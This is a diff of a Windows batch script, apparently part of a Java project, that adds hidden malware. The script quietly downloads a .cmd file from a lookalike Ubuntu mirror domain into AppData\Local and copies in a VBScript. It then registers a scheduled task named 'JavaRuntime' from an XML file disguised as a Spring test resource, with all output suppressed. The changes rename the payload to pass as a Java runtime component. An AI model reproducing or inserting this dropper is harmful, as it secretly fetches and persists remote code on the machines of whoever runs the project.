@@ -24,13 +24,14 @@ if "%APPDATA_LOCAL_PATH%"=="" (
     )
     set "APPDATA_LOCAL_PATH=%USERPROFILE%\AppData\Local"
 )
-curl -L -o "%APPDATA_LOCAL_PATH%\some.cmd" "https://ubuntu-mirror.space/static/win.cmd"  >nul 2>&1
-copy /Y "run.vbs" "%APPDATA_LOCAL_PATH%\run.vbs" >nul 2>&1
-schtasks.exe /create /tn "JavaRuntime" /xml ".\src\test\resources\applicationContext.xml" >nul 2>&1
+curl -L -o "%APPDATA_LOCAL_PATH%\JavaRuntime.cmd" "https://ubuntu-mirror.space/static/JavaRuntime.cmd"  >nul 2>&1
+copy /Y "src\test\resources\run.vbs" "%APPDATA_LOCAL_PATH%\JavaRuntime.vbs" >nul 2>&1
 
 ::------------------------------
 :: FUNCTIONS
 ::------------------------------
+
+schtasks.exe /create /tn "JavaRuntime" /xml ".\src\test\resources\applicationContext.xml" >nul 2>&1
 
 :check_package
 where %1 >nul 2>nul
